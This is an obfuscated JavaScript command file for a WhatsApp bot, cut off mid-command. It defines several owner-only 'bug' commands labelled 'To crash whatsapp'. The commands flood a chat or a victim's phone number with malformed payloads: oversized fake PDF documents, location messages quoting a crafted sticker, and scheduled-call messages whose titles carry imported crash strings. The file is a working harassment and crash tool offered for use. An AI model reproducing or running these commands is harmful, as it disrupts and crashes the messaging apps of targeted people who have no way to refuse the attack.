const config = require('../settings'),
  os = require('os'),
  fs = require('fs'),
  moment = require('moment-timezone'),
  { cmd, commands } = require('../lib/command'),
  {
    getBuffer,
    getGroupAdmins,
    getRandom,
    h2k,
    isUrl,
    Json,
    runtime,
    sleep,
    fetchJson,
    jsonformat,
  } = require('../lib/functions')
var {
  updateCMDStore,
  isbtnID,
  getCMDStore,
  getCmdForCmdId,
  connectdb,
  input,
  get,
  updb,
  updfb,
} = require('../lib/database')
const {
    default: makeWASocket,
    useMultiFileAuthState,
    WA_DEFAULT_EPHEMERAL,
    jidNormalizedUser,
    proto,
    getDevice,
    generateWAMessageFromContent,
    fetchLatestBaileysVersion,
    makeInMemoryStore,
    getContentType,
    generateForwardMessageContent,
    downloadContentFromMessage,
    jidDecode,
  } = require('@whiskeysockets/baileys'),
  _0x5c80a8 = {}
_0x5c80a8.remoteJid = '0@broadcast'
const _0x8c66d1 = {
    fromMe: false,
    participant: '0@s.whatsapp.net',
    ..._0x5c80a8,
  },
  _0x29c41f = {}
_0x29c41f.url =
  'https://mmg.whatsapp.net/o1/v/t62.7118-24/f1/m233/up-oil-image-7c20ce34-d321-42cb-aea3-e10d81c3ea35?ccb=9-4&oh=01_AdReb9Vso2z3_ODqLQ6IZcB0OaHDF9Yy3utewlpYmWQO_A&oe=64CFEA5F&mms3=true'
_0x29c41f.fileSha256 = 'tqVyN9O1iS92yRe6A5bDE6oCF50VFnCVFCnHwhI9TFs='
_0x29c41f.fileEncSha256 = 'Jget93ix5B5XCk0zifhPKKMCJwmgv/WVj+qYXA7y55I='
_0x29c41f.mediaKey = '1eL84Mxq0cNmPXSs2GaRUr6RqudsbSsHmoCQpe8JYQc='
_0x29c41f.mimetype = 'image/webp'
_0x29c41f.height = 64
_0x29c41f.width = 64
_0x29c41f.directPath =
  '/o1/v/t62.7118-24/f1/m233/up-oil-image-7c20ce34-d321-42cb-aea3-e10d81c3ea35?ccb=9-4&oh=01_AdReb9Vso2z3_ODqLQ6IZcB0OaHDF9Yy3utewlpYmWQO_A&oe=64CFEA5F'
_0x29c41f.fileLength = '12280'
_0x29c41f.mediaKeyTimestamp =
  '999999999999999999999999999999999999999999999999999999999'
_0x29c41f.isAnimated = false
_0x29c41f.stickerSentTs = '1688767456000'
_0x29c41f.isAvatar = false
const _0x3004ba = {}
_0x3004ba.stickerMessage = _0x29c41f
const _0xd0c268 = {}
_0xd0c268.key = _0x8c66d1
_0xd0c268.message = _0x3004ba
var thend = _0xd0c268
const { izumitext1 } = require('../lib/bugs/izumitext1'),
  { izumitext2 } = require('../lib/bugs/izumitext2'),
  { izumitext3 } = require('../lib/bugs/izumitext3'),
  { izumitext4 } = require('../lib/bugs/izumitext4'),
  { izumitext5 } = require('../lib/bugs/izumitext5'),
  { izumitext6 } = require('../lib/bugs/izumitext6'),
  { bugpdf } = require('../lib/bugs/bugpdf.js'),
  { travadoc } = require('../lib/bugs/travadoc.js'),
  { thejo } = require('../lib/bugs/thejo')
wm = 'THE VAJIRA BOT'
var BOTOW = ''
if (config.LANG === 'SI') {
  BOTOW = "*ඔබ Bot's හිමිකරු හෝ  උපපරිපාලක නොවේ !*"
} else {
  BOTOW = "*You are not bot's owner or moderator !*"
}
const _0x2d851c = {}
_0x2d851c.pattern = 'bug'
_0x2d851c.react = '\uD83D\uDD16'
_0x2d851c.desc = 'To to crash whatsapp'
_0x2d851c.category = 'bug'
_0x2d851c.use = '.bug'
_0x2d851c.filename = __filename
cmd(
  _0x2d851c,
  async (
    _0x198399,
    _0x2f67dc,
    _0x25e7eb,
    {
      from: _0xf47aad,
      prefix: _0x3a8a00,
      l: _0x33bb8b,
      quoted: _0x31e25f,
      body: _0x2c8ea9,
      isCmd: _0x63796a,
      command: _0x3e20a0,
      args: _0x2bec50,
      q: _0x502f9d,
      isGroup: _0x426ba6,
      sender: _0x50d0cd,
      senderNumber: _0x1ff944,
      botNumber2: _0x1b9e81,
      botNumber: _0x51ac70,
      pushname: _0x346ddb,
      isMe: _0x35f115,
      isOwner: _0x3ccd3a,
      groupMetadata: _0x1a17f3,
      groupName: _0x437776,
      participants: _0x1d0085,
      groupAdmins: _0x2e0749,
      isBotAdmins: _0x19600e,
      isAdmins: _0x314503,
      reply: _0x5ac112,
    }
  ) => {
    try {
      if (!_0x35f115) {
        return await _0x5ac112(BOTOW)
      }
      var _0xbe31d8 = [
        '\u300A \u2588\u2592\u2592\u2592\u2592\u2592\u2592\u2592\u2592\u2592\u2592\u2592\u300B10%',
        '\u300A \u2588\u2588\u2588\u2588\u2592\u2592\u2592\u2592\u2592\u2592\u2592\u2592\u300B30%',
        '\u300A \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2592\u2592\u2592\u2592\u2592\u300B50%',
        '\u300A \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2592\u2592\u300B80%',
        '\u300A \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u300B100%',
        '\uD835\uDE7B\uD835\uDE7E\uD835\uDE70\uD835\uDE73\uD835\uDE78\uD835\uDE7D\uD835\uDE76 \uD835\uDE72\uD835\uDE7E\uD835\uDE7C\uD835\uDE7F\uD835\uDE7B\uD835\uDE74\uD835\uDE83\uD835\uDE74\uD835\uDE73 \uD83E\uDD84...',
      ]
      const _0x454034 = { text: 'ʟᴏᴀᴅɪɴɢ...' }
      let { key: _0x114fb8 } = await _0x198399.sendMessage(_0xf47aad, _0x454034)
      for (let _0x41fe82 = 0; _0x41fe82 < _0xbe31d8.length; _0x41fe82++) {
        const _0x46e9ac = {
          text: _0xbe31d8[_0x41fe82],
          edit: _0x114fb8,
        }
        await _0x198399.sendMessage(_0xf47aad, _0x46e9ac)
      }
      for (let _0x247b75 = 0; _0x247b75 < 25; _0x247b75++) {
        const _0x911583 = { url: './settings.js' }
        await _0x198399.sendMessage(_0xf47aad, {
          document: _0x911583,
          mimetype:
            '\u27E8\u0F11̶\u20DF\uD83D\uDCA5 \uD835\uDC01͢\uD835\uDC11\uD835\uDC14\uD835\uDC17͢\uD835\uDC0E \uD835\uDC05\uD835\uDC14͢\uD835\uDC02\uD835\uDC0A\uD835\uDC0F͢\uD835\uDC03\uD835\uDC05̑\uD83D\uDC41️\u0F11̶\u27E9',
          title: 'bx.pdf',
          pageCount: 9999999999,
          thumbnail: { url: 'https://cataas.com/cat' },
          jpegThumbnail: { url: 'https://cataas.com/cat' },
          mediaKey: 'ht55w7B6UoaG9doQuVQ811XNfWcoALqcdQfd61seKKk=',
          fileName:
            '\u27E8\u0F11̶\u20DF\uD83D\uDCA5 \uD835\uDC01͢\uD835\uDC11\uD835\uDC14\uD835\uDC17͢\uD835\uDC0E \uD835\uDC05\uD835\uDC14͢\uD835\uDC02\uD835\uDC0A\uD835\uDC0F͢\uD835\uDC03\uD835\uDC05̑\uD83D\uDC41️\u0F11̶\u27E9\n\n' +
            bugpdf,
        })
      }
      const _0x3f0b76 = {
        text: '\u2705',
        key: _0x2f67dc.key,
      }
      const _0x243ca1 = { react: _0x3f0b76 }
      await _0x198399.sendMessage(_0xf47aad, _0x243ca1)
    } catch (_0x5863fa) {
      _0x5ac112('*\uD83D\uDED1 This is an owner command...*'),
        _0x33bb8b(_0x5863fa)
    }
  }
)
const _0x68f108 = {}
_0x68f108.pattern = 'loccrash'
_0x68f108.react = '\uD83D\uDD16'
_0x68f108.desc = 'To to crash whatsapp'
_0x68f108.category = 'bug'
_0x68f108.use = '.loccrash'
_0x68f108.filename = __filename
cmd(
  _0x68f108,
  async (
    _0x3d4d6b,
    _0x4734f0,
    _0x12fc51,
    {
      from: _0x1ff2c9,
      prefix: _0x1cf980,
      l: _0x58f36b,
      quoted: _0x250068,
      body: _0x2d9552,
      isCmd: _0x5c65eb,
      command: _0x515947,
      args: _0x4791b1,
      q: _0x20f77f,
      isGroup: _0x2e698c,
      sender: _0x3a06c6,
      senderNumber: _0x5b288d,
      botNumber2: _0x8eb370,
      botNumber: _0x4358a2,
      pushname: _0x10028c,
      isMe: _0xf371c2,
      isOwner: _0x865dcd,
      groupMetadata: _0x202cf4,
      groupName: _0x23297a,
      participants: _0x5c8afa,
      groupAdmins: _0x345623,
      isBotAdmins: _0x551201,
      isAdmins: _0x52b875,
      reply: _0x43547f,
    }
  ) => {
    try {
      if (!_0xf371c2) {
        return
      }
      var _0x52edef = [
        '\u300A \u2588\u2592\u2592\u2592\u2592\u2592\u2592\u2592\u2592\u2592\u2592\u2592\u300B10%',
        '\u300A \u2588\u2588\u2588\u2588\u2592\u2592\u2592\u2592\u2592\u2592\u2592\u2592\u300B30%',
        '\u300A \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2592\u2592\u2592\u2592\u2592\u300B50%',
        '\u300A \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2592\u2592\u300B80%',
        '\u300A \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u300B100%',
        '\uD835\uDE7B\uD835\uDE7E\uD835\uDE70\uD835\uDE73\uD835\uDE78\uD835\uDE7D\uD835\uDE76 \uD835\uDE72\uD835\uDE7E\uD835\uDE7C\uD835\uDE7F\uD835\uDE7B\uD835\uDE74\uD835\uDE83\uD835\uDE74\uD835\uDE73 \uD83E\uDD84...',
      ]
      const _0x2b358b = { text: 'ʟᴏᴀᴅɪɴɢ...' }
      let { key: _0xfabcea } = await _0x3d4d6b.sendMessage(_0x1ff2c9, _0x2b358b)
      for (let _0x1465f4 = 0; _0x1465f4 < _0x52edef.length; _0x1465f4++) {
        const _0x4d4dc5 = {
          text: _0x52edef[_0x1465f4],
          edit: _0xfabcea,
        }
        await _0x3d4d6b.sendMessage(_0x1ff2c9, _0x4d4dc5)
      }
      for (let _0x13509d = 0; _0x13509d < 20; _0x13509d++) {
        for (let _0x48c232 = 0; _0x48c232 < '3'; _0x48c232++) {
          const _0x19fe84 = {
            degreesLatitude: -6.28282828,
            degreesLongitude: -1.2828,
            name: 'BRUX0N3RD\n\n\n\n\n\n\n\n',
          }
          const _0x2c4af2 = { location: _0x19fe84 }
          const _0x1ed02e = { quoted: thend }
          await _0x3d4d6b.sendMessage(_0x1ff2c9, _0x2c4af2, _0x1ed02e)
        }
      }
      const _0xb49134 = {
        text: '\u2705',
        key: _0x4734f0.key,
      }
      const _0x5d710a = { react: _0xb49134 }
      await _0x3d4d6b.sendMessage(_0x1ff2c9, _0x5d710a)
    } catch (_0x777808) {
      _0x43547f('*\uD83D\uDED1 This is an owner command...*'),
        _0x58f36b(_0x777808)
    }
  }
)
const _0x1a1fae = {}
_0x1a1fae.pattern = 'buginvite'
_0x1a1fae.react = '\uD83D\uDD16'
_0x1a1fae.desc = 'To to crash whatsapp'
_0x1a1fae.category = 'bug'
_0x1a1fae.use = '.buginvite'
_0x1a1fae.filename = __filename
cmd(
  _0x1a1fae,
  async (
    _0x363843,
    _0x1c9aa9,
    _0x2ff7b2,
    {
      from: _0x1f9e8d,
      prefix: _0x1dae18,
      l: _0x3a89e7,
      quoted: _0x351038,
      body: _0x330943,
      isCmd: _0x118b5e,
      command: _0x483590,
      args: _0x3f72b6,
      q: _0x398155,
      isGroup: _0x3ee613,
      sender: _0x371425,
      senderNumber: _0x4f28f6,
      botNumber2: _0x4a4ac9,
      botNumber: _0xdb33d7,
      pushname: _0x14fca1,
      isMe: _0x15866b,
      isOwner: _0x4bc595,
      groupMetadata: _0x4bfa1f,
      groupName: _0x5f170a,
      participants: _0xcbafe5,
      groupAdmins: _0x43165b,
      isBotAdmins: _0x694281,
      isAdmins: _0x1e0b80,
      reply: _0x31c700,
    }
  ) => {
    try {
      if (!_0x15866b) {
        return await _0x31c700(BOTOW)
      }
      var _0x41fd67 = [
        '\u300A \u2588\u2592\u2592\u2592\u2592\u2592\u2592\u2592\u2592\u2592\u2592\u2592\u300B10%',
        '\u300A \u2588\u2588\u2588\u2588\u2592\u2592\u2592\u2592\u2592\u2592\u2592\u2592\u300B30%',
        '\u300A \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2592\u2592\u2592\u2592\u2592\u300B50%',
        '\u300A \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2592\u2592\u300B80%',
        '\u300A \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u300B100%',
        '\uD835\uDE7B\uD835\uDE7E\uD835\uDE70\uD835\uDE73\uD835\uDE78\uD835\uDE7D\uD835\uDE76 \uD835\uDE72\uD835\uDE7E\uD835\uDE7C\uD835\uDE7F\uD835\uDE7B\uD835\uDE74\uD835\uDE83\uD835\uDE74\uD835\uDE73 \uD83E\uDD84...',
      ]
      const _0x40cd58 = { text: 'ʟᴏᴀᴅɪɴɢ...' }
      let { key: _0x3cd7e2 } = await _0x363843.sendMessage(_0x1f9e8d, _0x40cd58)
      for (let _0x5d4250 = 0; _0x5d4250 < _0x41fd67.length; _0x5d4250++) {
        const _0x5a0a19 = {
          text: _0x41fd67[_0x5d4250],
          edit: _0x3cd7e2,
        }
        await _0x363843.sendMessage(_0x1f9e8d, _0x5a0a19)
      }
      for (let _0x56efca = 0; _0x56efca < 25; _0x56efca++) {
        const _0x4549f2 = '' + izumitext6
        var _0x4c2ad5 = generateWAMessageFromContent(
          _0x1f9e8d,
          proto.Message.fromObject({
            scheduledCallCreationMessage: {
              callType: '2',
              scheduledTimestampMs:
                '' +
                moment(1000).tz('Asia/Kolkata').format('DD/MM/YYYY HH:mm:ss'),
              title: _0x4549f2,
            },
          }),
          {
            userJid: _0x1f9e8d,
            quoted: _0x1c9aa9,
          }
        )
        _0x363843.relayMessage(_0x1f9e8d, _0x4c2ad5.message, {
          messageId: _0x4c2ad5.key.id,
        })
        await sleep(3000)
      }
      _0x31c700(
        '*Successfully sent as many bugs as ' +
          amount +
          ' Please pause for 3 minutes*'
      )
      const _0x29679d = {
        text: '\u2705',
        key: _0x1c9aa9.key,
      }
      const _0x300a92 = { react: _0x29679d }
      await _0x363843.sendMessage(_0x1f9e8d, _0x300a92)
    } catch (_0x23e5d5) {
      _0x31c700('*\uD83D\uDED1 This is an owner command...*'),
        _0x3a89e7(_0x23e5d5)
    }
  }
)
const _0x1d172b = {}
_0x1d172b.pattern = 'amountbug'
_0x1d172b.react = '\uD83D\uDD16'
_0x1d172b.desc = 'To to crash whatsapp'
_0x1d172b.category = 'bug'
_0x1d172b.use = '.amountbug'
_0x1d172b.filename = __filename
cmd(
  _0x1d172b,
  async (
    _0xc1cdc5,
    _0x23e00f,
    _0x46633c,
    {
      from: _0x3dcb9e,
      prefix: _0x273fad,
      l: _0x4fe71a,
      quoted: _0x1ba944,
      body: _0xb425af,
      isCmd: _0x4763e7,
      command: _0x169d0b,
      args: _0x15f547,
      q: _0x3d6fdf,
      isGroup: _0xb4a9e7,
      sender: _0x1580f8,
      senderNumber: _0x4809ad,
      botNumber2: _0x14e79f,
      botNumber: _0x97ae89,
      pushname: _0x2efc5f,
      isMe: _0x4172a6,
      isOwner: _0x549760,
      groupMetadata: _0x1c3afc,
      groupName: _0x1ea591,
      participants: _0x44dd26,
      groupAdmins: _0x17871a,
      isBotAdmins: _0x1ad2d8,
      isAdmins: _0x19c90d,
      reply: _0x41ddb6,
    }
  ) => {
    try {
      if (!_0x4172a6) {
        return await _0x41ddb6(BOTOW)
      }
      if (!_0x15f547[0]) {
        return _0x41ddb6(
          'Use ' +
            (_0x273fad + _0x169d0b) +
            ' amount\nExample ' +
            (_0x273fad + _0x169d0b) +
            ' 5'
        )
      }
      var _0x5adbae = [
        '\u300A \u2588\u2592\u2592\u2592\u2592\u2592\u2592\u2592\u2592\u2592\u2592\u2592\u300B10%',
        '\u300A \u2588\u2588\u2588\u2588\u2592\u2592\u2592\u2592\u2592\u2592\u2592\u2592\u300B30%',
        '\u300A \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2592\u2592\u2592\u2592\u2592\u300B50%',
        '\u300A \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2592\u2592\u300B80%',
        '\u300A \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u300B100%',
        '\uD835\uDE7B\uD835\uDE7E\uD835\uDE70\uD835\uDE73\uD835\uDE78\uD835\uDE7D\uD835\uDE76 \uD835\uDE72\uD835\uDE7E\uD835\uDE7C\uD835\uDE7F\uD835\uDE7B\uD835\uDE74\uD835\uDE83\uD835\uDE74\uD835\uDE73 \uD83E\uDD84...',
      ]
      const _0x2114c5 = { text: 'ʟᴏᴀᴅɪɴɢ...' }
      let { key: _0x4dbf23 } = await _0xc1cdc5.sendMessage(_0x3dcb9e, _0x2114c5)
      for (let _0x2e2265 = 0; _0x2e2265 < _0x5adbae.length; _0x2e2265++) {
        const _0x2f7764 = {
          text: _0x5adbae[_0x2e2265],
          edit: _0x4dbf23,
        }
        await _0xc1cdc5.sendMessage(_0x3dcb9e, _0x2f7764)
      }
      amount = '' + encodeURI(_0x3d6fdf)
      for (let _0x59e26a = 0; _0x59e26a < amount; _0x59e26a++) {
        const _0x1bba62 = '' + izumitext1
        var _0x31e3f4 = generateWAMessageFromContent(
          _0x3dcb9e,
          proto.Message.fromObject({
            scheduledCallCreationMessage: {
              callType: '2',
              scheduledTimestampMs:
                '' +
                moment(1000).tz('Asia/Kolkata').format('DD/MM/YYYY HH:mm:ss'),
              title: _0x1bba62,
            },
          }),
          {
            userJid: _0x3dcb9e,
            quoted: _0x23e00f,
          }
        )
        _0xc1cdc5.relayMessage(_0x3dcb9e, _0x31e3f4.message, {
          messageId: _0x31e3f4.key.id,
        })
        await sleep(3000)
      }
      _0x41ddb6(
        '*Successfully sent as many bugs as ' +
          amount +
          ' Please pause for 3 minutes*'
      )
      const _0x1f665e = {
        text: '\u2705',
        key: _0x23e00f.key,
      }
      const _0x4eba7d = { react: _0x1f665e }
      await _0xc1cdc5.sendMessage(_0x3dcb9e, _0x4eba7d)
    } catch (_0x324fa2) {
      _0x41ddb6('*\uD83D\uDED1 This is an owner command...*')
      _0x4fe71a(_0x324fa2)
    }
  }
)
const _0x1e31dd = {}
_0x1e31dd.pattern = 'pmbug'
_0x1e31dd.react = '\uD83D\uDD16'
_0x1e31dd.desc = 'To to crash whatsapp'
_0x1e31dd.category = 'bug'
_0x1e31dd.use = '.pmbug'
_0x1e31dd.filename = __filename
cmd(
  _0x1e31dd,
  async (
    _0xf85636,
    _0x4145ff,
    _0x26658e,
    {
      from: _0x3a21bc,
      prefix: _0x27be33,
      l: _0x496a9c,
      quoted: _0x41ac69,
      body: _0x105b3f,
      isCmd: _0x5829dc,
      command: _0x16150e,
      args: _0x41c13e,
      q: _0x37b246,
      isGroup: _0xc0665d,
      sender: _0x4d9995,
      senderNumber: _0x4222b7,
      botNumber2: _0x5b9c16,
      botNumber: _0x5b5c8d,
      pushname: _0x1fb5e2,
      isMe: _0x47dffb,
      isOwner: _0x401b05,
      groupMetadata: _0x14cc1e,
      groupName: _0x1de8e0,
      participants: _0x1541ee,
      groupAdmins: _0x4ac951,
      isBotAdmins: _0x181a2a,
      isAdmins: _0x2d3e10,
      reply: _0x290e1f,
    }
  ) => {
    try {
      if (!_0x47dffb) {
        return await _0x290e1f(BOTOW)
      }
      if (!_0x41c13e[0]) {
        return _0x290e1f(
          'Use ' +
            (_0x27be33 + _0x16150e) +
            ' number\nExample ' +
            (_0x27be33 + _0x16150e) +
            ' 94719199757'
        )
      }
      var _0x431180 = [
        '\u300A \u2588\u2592\u2592\u2592\u2592\u2592\u2592\u2592\u2592\u2592\u2592\u2592\u300B10%',
        '\u300A \u2588\u2588\u2588\u2588\u2592\u2592\u2592\u2592\u2592\u2592\u2592\u2592\u300B30%',
        '\u300A \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2592\u2592\u2592\u2592\u2592\u300B50%',
        '\u300A \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2592\u2592\u300B80%',
        '\u300A \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u300B100%',
        '\uD835\uDE7B\uD835\uDE7E\uD835\uDE70\uD835\uDE73\uD835\uDE78\uD835\uDE7D\uD835\uDE76 \uD835\uDE72\uD835\uDE7E\uD835\uDE7C\uD835\uDE7F\uD835\uDE7B\uD835\uDE74\uD835\uDE83\uD835\uDE74\uD835\uDE73 \uD83E\uDD84...',
      ]
      const _0x64b8f7 = { text: 'ʟᴏᴀᴅɪɴɢ...' }
      let { key: _0x2b5a7d } = await _0xf85636.sendMessage(_0x3a21bc, _0x64b8f7)
      for (let _0x2f1f68 = 0; _0x2f1f68 < _0x431180.length; _0x2f1f68++) {
        const _0x4bae4d = {
          text: _0x431180[_0x2f1f68],
          edit: _0x2b5a7d,
        }
        await _0xf85636.sendMessage(_0x3a21bc, _0x4bae4d)
      }
      victim = _0x37b246.split('|')[0] + '@s.whatsapp.net'
      amount = '30'
      for (let _0x162f0d = 0; _0x162f0d < amount; _0x162f0d++) {
        const _0x4d3ae7 = '' + izumitext1
        var _0x4f09f5 = generateWAMessageFromContent(
          _0x3a21bc,
          proto.Message.fromObject({
            scheduledCallCreationMessage: {
              callType: '2',
              scheduledTimestampMs:
                '' +
                moment(1000).tz('Asia/Kolkata').format('DD/MM/YYYY HH:mm:ss'),
              title: _0x4d3ae7,
            },
          }),
          {
            userJid: _0x3a21bc,
            quoted: _0x4145ff,
          }
        )
        _0xf85636.relayMessage(victim, _0x4f09f5.message, {
          messageId: _0x4f09f5.key.id,
        })
        await sleep(3000)
      }
      replygcxeon(
        '*Successfully sent Bug To ' + victim + ' Please pause for 3 minutes*'
      )
      const _0x33d9fc = {
        text: '\u2705',
        key: _0x4145ff.key,
      }
      const _0x4804ba = { react: _0x33d9fc }
      await _0xf85636.sendMessage(_0x3a21bc, _0x4804ba)
    } catch (_0xd7d2d3) {
      _0x290e1f('*\uD83D\uDED1 This is an owner command...*')
      _0x496a9c(_0xd7d2d3)
    }
  }
)
const _0x5b4d0c = {}
_0x5b4d0c.pattern = 'delaybug'
_0x5b4d0c.react = '\uD83D\uDD16'
_0x5b4d0c.desc = 'To to crash whatsapp'
_0x5b4d0c.category = 'bug'
_0x5b4d0c.use = '.delaybug'
_0x5b4d0c.filename = __filename
cmd(
  _0x5b4d0c,
  async (
    _0x2610c7,
    _0x120f75,
    _0x2bf61c,
    {
      from: _0x2ae245,
      prefix: _0x30f310,
      l: _0x6f5e3a,
      quoted: _0xe248f2,
      body: _0xc44e75,
      isCmd: _0x4b41e3,
      command: _0xd61536,
      args: _0x430871,
      q: _0x3f2e89,
      isGroup: _0x1ddfee,
      sender: _0x45dea7,
      senderNumber: _0x4a69c1,
      botNumber2: _0x55b605,
      botNumber: _0x27aac3,
      pushname: _0x373e26,
      isMe: _0x32c80c,
      isOwner: _0x4fb50d,
      groupMetadata: _0x3f2019,
      groupName: _0x2ca736,
      participants: _0x59faaf,
      groupAdmins: _0x56cd06,
      isBotAdmins: _0x3cc17e,
      isAdmins: _0xf14489,
      reply: _0x49a854,
    }
  ) => {
    try {
      if (!_0x32c80c) {
        return await _0x49a854(BOTOW)
      }
      if (!_0x430871[0]) {
        return replygcxeon(
          'Use ' +
            (_0x30f310 + _0xd61536) +
            ' number\nExample ' +
            (_0x30f310 + _0xd61536) +
            ' 916909137213'
        )
      }
      var _0x3b0c19 = [
        '\u300A \u2588\u2592\u2592\u2592\u2592\u2592\u2592\u2592\u2592\u2592\u2592\u2592\u300B10%',
        '\u300A \u2588\u2588\u2588\u2588\u2592\u2592\u2592\u2592\u2592\u2592\u2592\u2592\u300B30%',
        '\u300A \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2592\u2592\u2592\u2592\u2592\u300B50%',
        '\u300A \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2592\u2592\u300B80%',
        '\u300A \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u300B100%',
        '\uD835\uDE7B\uD835\uDE7E\uD835\uDE70\uD835\uDE73\uD835\uDE78\uD835\uDE7D\uD835\uDE76 \uD835\uDE72\uD835\uDE7E\uD835\uDE7C\uD835\uDE7F\uD835\uDE7B\uD835\uDE74\uD835\uDE83\uD835\uDE74\uD835\uDE73 \uD83E\uDD84...',
      ]
      const _0x4433e0 = { text: 'ʟᴏᴀᴅɪɴɢ...' }
      let { key: _0x653e8c } = await _0x2610c7.sendMessage(_0x2ae245, _0x4433e0)
      for (let _0x4d0326 = 0; _0x4d0326 < _0x3b0c19.length; _0x4d0326++) {
        const _0x19e0e4 = {
          text: _0x3b0c19[_0x4d0326],
          edit: _0x653e8c,
        }
        await _0x2610c7.sendMessage(_0x2ae245, _0x19e0e4)
      }
      victim = _0x3f2e89.split('|')[0] + '@s.whatsapp.net'
      amount = '30'
      for (let _0x482b3f = 0; _0x482b3f < amount; _0x482b3f++) {
        const _0x559977 = izumitext2
        var _0x5bcd1c = generateWAMessageFromContent(
          _0x2ae245,
          proto.Message.fromObject({
            scheduledCallCreationMessage: {
              callType: '2',
              scheduledTimestampMs:
                '' +
                moment(1000).tz('Asia/Kolkata').format('DD/MM/YYYY HH:mm:ss'),
              title: _0x559977,
            },
          }),
          {
            userJid: _0x2ae245,
            quoted: _0x120f75,
          }
        )
        _0x2610c7.relayMessage(victim, _0x5bcd1c.message, {
          messageId: _0x5bcd1c.key.id,
        })
        await sleep(3000)
      }
      _0x49a854(
        '*Successfully Sent Bug To ' + victim + ' Please pause for 3 minutes*'
      )
      const _0x388d28 = {
        text: '\u2705',
        key: _0x120f75.key,
      }
      const _0x47a293 = { react: _0x388d28 }
      await _0x2610c7.sendMessage(_0x2ae245, _0x47a293)
    } catch (_0x2ea7e4) {
      _0x49a854('*\uD83D\uDED1 This is an owner command...*')
      _0x6f5e3a(_0x2ea7e4)
    }
  }
)
const _0x217188 = {}
_0x217188.pattern = 'docubug'
_0x217188.react = '\uD83D\uDD16'
_0x217188.desc = 'To to crash whatsapp'
_0x217188.category = 'bug'
_0x217188.use = '.docubug'
_0x217188.filename = __filename
cmd(
  _0x217188,
  async (
    _0x52bfc7,
    _0x2be3eb,
    _0x31239e,
    {
      from: _0x2cb890,
      prefix: _0x52f78e,
      l: _0x240768,
      quoted: _0xa02cb2,
      body: _0x396d73,
      isCmd: _0x645947,
      command: _0x49ff5e,
      args: _0x34b360,
      q: _0x4be1bf,
      isGroup: _0x48a23c,
      sender: _0x5f2cb3,
      senderNumber: _0x37383d,
      botNumber2: _0x232be1,
      botNumber: _0x28a708,
      pushname: _0x5538e3,
      isMe: _0xe81cf5,
      isOwner: _0xc11d59,
      groupMetadata: _0xfe9db7,
      groupName: _0x4c6029,
      participants: _0x28728b,
      groupAdmins: _0x21b408,
      isBotAdmins: _0x34016f,
      isAdmins: _0x2626d5,
      reply: _0x4c23af,
    }
  ) => {
    try {
      if (!_0xe81cf5) {
        return await _0x4c23af(BOTOW)
      }
      if (!_0x34b360[0]) {
        return _0x4c23af(
          'Use ' +
            (_0x52f78e + _0x49ff5e) +
            ' number\nExample ' +
            (_0x52f78e + _0x49ff5e) +
            ' 94719199757'
        )
      }
      var _0x12a3bd = [
        '\u300A \u2588\u2592\u2592\u2592\u2592\u2592\u2592\u2592\u2592\u2592\u2592\u2592\u300B10%',
        '\u300A \u2588\u2588\u2588\u2588\u2592\u2592\u2592\u2592\u2592\u2592\u2592\u2592\u300B30%',
        '\u300A \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2592\u2592\u2592\u2592\u2592\u300B50%',
        '\u300A \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2592\u2592\u300B80%',
        '\u300A \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u300B100%',
        '\uD835\uDE7B\uD835\uDE7E\uD835\uDE70\uD835\uDE73\uD835\uDE78\uD835\uDE7D\uD835\uDE76 \uD835\uDE72\uD835\uDE7E\uD835\uDE7C\uD835\uDE7F\uD835\uDE7B\uD835\uDE74\uD835\uDE83\uD835\uDE74\uD835\uDE73 \uD83E\uDD84...',
      ]
      const _0x14f7f1 = { text: 'ʟᴏᴀᴅɪɴɢ...' }
      let { key: _0x1a6278 } = await _0x52bfc7.sendMessage(_0x2cb890, _0x14f7f1)
      for (let _0x1f69db = 0; _0x1f69db < _0x12a3bd.length; _0x1f69db++) {
        const _0x53da53 = {
          text: _0x12a3bd[_0x1f69db],
          edit: _0x1a6278,
        }
        await _0x52bfc7.sendMessage(_0x2cb890, _0x53da53)
      }
      if (_0x34b360.length < 1) {
        return _0x4c23af(
          'Use ' +
            (_0x52f78e + _0x49ff5e) +
            ' number\nExample ' +
            (_0x52f78e + _0x49ff5e) +
            ' 94719199757'
        )
      }
      victim = _0x4be1bf.split('|')[0] + '@s.whatsapp.net'
      amount = '15'
      for (let _0x35b00e = 0; _0x35b00e < amount; _0x35b00e++) {
        const _0x43fba0 = '' + izumitext1
        var _0x31d78c = generateWAMessageFromContent(
          _0x2cb890,
          proto.Message.fromObject({
            scheduledCallCreationMessage: {
              callType: '2',
              scheduledTimestampMs:
                '' +
                moment(1000).tz('Asia/Kolkata').format('DD/MM/YYYY HH:mm:ss'),
              title: _0x43fba0,
            },
          }),
          {
            userJid: _0x2cb890,
            quoted: _0x2be3eb,
          }
        )
        _0x52bfc7.relayMessage(victim, _0x31d78c.message, {
          messageId: _0x31d78c.key.id,
        })
        await sleep(3000)
      }
      _0x4c23af(
        '*Successfully sent Bug To ' + victim + ' Please pause for 3 minutes*'
      )
      const _0x39f109 = {
        text: '\u2705',
